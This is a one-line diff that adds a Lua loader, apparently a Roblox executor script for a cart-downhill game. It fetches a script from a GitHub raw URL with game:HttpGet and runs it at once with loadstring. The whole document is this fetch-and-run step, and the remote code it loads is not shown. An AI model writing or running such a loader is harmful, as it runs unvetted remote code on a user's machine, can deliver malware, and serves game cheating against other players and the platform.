@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/drive-a-cart-downhill-spam7-eeo0ocz6o7jc7i.lua"))()
